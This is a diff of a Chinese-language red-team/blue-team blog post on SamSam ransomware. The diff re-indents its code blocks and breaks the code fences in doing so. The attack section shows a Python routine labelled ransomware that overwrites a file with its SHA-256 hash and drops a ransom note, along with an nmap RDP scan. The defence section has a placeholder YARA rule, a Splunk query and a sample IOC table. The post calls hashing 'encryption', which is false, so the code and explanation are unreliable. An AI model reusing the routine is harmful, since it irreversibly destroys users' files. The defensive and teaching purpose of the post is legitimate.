@@ -22,29 +22,34 @@ categories: [security]
 
 ## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
 * **攻擊前置需求**: 攻擊者需要有受害者的 RDP 登入憑證或能夠暴力破解登入密碼。
-* **Payload 建構邏輯**: 
-  ```python
-  # SamSam 勒索軟體的基本結構
-  import os
-  import hashlib
+* **Payload 建構邏輯**:
 
-  def encrypt_file(file_path):
-    # 加密檔案
-    with open(file_path, 'rb') as file:
-      file_data = file.read()
-    encrypted_data = hashlib.sha256(file_data).digest()
-    with open(file_path, 'wb') as file:
-      file.write(encrypted_data)
-
-  def leave_ransom_note():
-    # 留下勒索訊息
-    with open('ransom_note.txt', 'w') as file:
-      file.write('您的檔案已被加密，請支付贖金以解密。')
-
-  # 執行加密與留下勒索訊息
-  encrypt_file('example.txt')
-  leave_ransom_note()
-  ```
+    ```
+    
+    python
+      # SamSam 勒索軟體的基本結構
+      import os
+      import hashlib
+    
+      def encrypt_file(file_path):
+        # 加密檔案
+        with open(file_path, 'rb') as file:
+          file_data = file.read()
+        encrypted_data = hashlib.sha256(file_data).digest()
+        with open(file_path, 'wb') as file:
+          file.write(encrypted_data)
+    
+      def leave_ransom_note():
+        # 留下勒索訊息
+        with open('ransom_note.txt', 'w') as file:
+          file.write('您的檔案已被加密，請支付贖金以解密。')
+    
+      # 執行加密與留下勒索訊息
+      encrypt_file('example.txt')
+      leave_ransom_note()
+      
+    
+    ```
   *範例指令*: 使用 `nmap` 掃描 RDP 服務的指令：`nmap -p 3389 <target_ip>`
 
 ## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
@@ -53,18 +58,23 @@ categories: [security]
   | --- | --- | --- | --- |
   | 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\SamSam.exe |
 * **偵測規則 (Detection Rules)**:
-  ```yara
-  rule SamSam_Ransomware {
-    meta:
-      description = "Detects SamSam ransomware"
-      author = "Your Name"
-    strings:
-      $a = "SamSam" ascii
-      $b = "ransom_note.txt" ascii
-    condition:
-      $a and $b
-  }
-  ```
+
+    ```
+    
+    yara
+      rule SamSam_Ransomware {
+        meta:
+          description = "Detects SamSam ransomware"
+          author = "Your Name"
+        strings:
+          $a = "SamSam" ascii
+          $b = "ransom_note.txt" ascii
+        condition:
+          $a and $b
+      }
+      
+    
+    ```
   * **SIEM 查詢語法** (Splunk)：`index=security (eventtype=login_failure OR eventtype=malware_detection) | stats count by src_ip`
 * **緩解措施**: 
   1. 更新 RDP 服務的安全補丁。
@@ -80,5 +90,4 @@ categories: [security]
 ## 5. 🔗 參考文獻與延伸閱讀
 - [原始報告](https://www.cisa.gov/news-events/cybersecurity-advisories/aa18-337a)
 - [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1210/)
-
 
